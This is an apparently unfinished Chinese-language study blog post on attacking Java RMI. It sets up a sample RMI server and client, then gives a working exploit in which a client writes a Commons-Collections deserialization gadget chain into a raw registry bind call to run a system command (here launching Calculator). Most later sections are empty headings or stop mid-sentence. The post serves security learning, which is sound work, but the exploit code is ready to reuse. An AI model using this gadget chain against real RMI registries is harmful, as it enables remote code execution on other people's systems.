---
layout:     post                    # 使用的布局（不需要改）
title:      RMI学习(三)               # 标题 
subtitle:   RMI攻击方法
date:       2022-03-20              # 时间
author:     Von                      # 作者
header-img: img/post-bg-ioses.jpg
catalog: true                       # 是否归档
tags:                               #标签
    - Web
    - Java

---

# 前言

通过前面的学习我们知道在RMI的全流程中，只有：

服务端创建远程对象、注册中心创建registry、客户端获取registry三个过程是完全本地的过程，其他涉及两个对象间交互的过程都存在反序列化漏洞利用点

我们先以初始的一套代码模版来构建RMI服务：

首先是继承了Remote接口的接口

```java
import java.rmi.Remote;

public interface RMIInterface extends Remote {

}
```

暂时为空的实现

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RMIimpl extends UnicastRemoteObject implements RMIInterface{
    RMIimpl() throws RemoteException {
    }
} 
```

Server端

```java
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {
        RMIimpl rmIimpl = new RMIimpl();
        Registry registry = LocateRegistry.createRegistry(1098);
        registry.bind("test",rmIimpl);
    }
}
```

Client端

```java
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry(1098);
        RMIInterface test = (RMIInterface) registry.lookup("test");
    }
}
```

# 客户端攻击注册中心

之前我们提过



这里学习了一个新知识，java的getDeclaredField方法只能得到其本类声明的属性，像传入一个子类的class对象是得不到其父类中声明的属性的，要用getSuperclass()得到其父类对象才可以进一步操作。

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.rmi.server.UnicastRef;
import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;

public class Client {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(1098);
        Class cls = registry.getClass();
        Field ref = cls.getSuperclass().getSuperclass().getDeclaredField("ref");
        ref.setAccessible(true);
        UnicastRef unicastRef = (UnicastRef) ref.get(registry);
        RemoteCall newCall = unicastRef.newCall((RemoteObject) registry,new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")},2, 4905912898345647071L);
        ObjectOutput optstream = newCall.getOutputStream();
        optstream.writeObject(evilobj());
        unicastRef.invoke(newCall);
    }
    public static Object evilobj() throws NoSuchFieldException, IllegalAccessException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})});
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);
        HashMap<Object, Object> hashMapnew = new HashMap<>();
        TiedMapEntry mapentry = new TiedMapEntry(new HashMap(), 'a');
        hashMapnew.put(mapentry,'b');
        Field mapfield = TiedMapEntry.class.getDeclaredField("map");
        mapfield.setAccessible(true);
        mapfield.set(mapentry,lazymap);
        return hashMapnew;
    }
}
```



# 服务端攻击注册中心

其实按照流程来说服务

# 注册中心攻击服务端



# 客户端攻击服务端



# 服务端攻击客户端







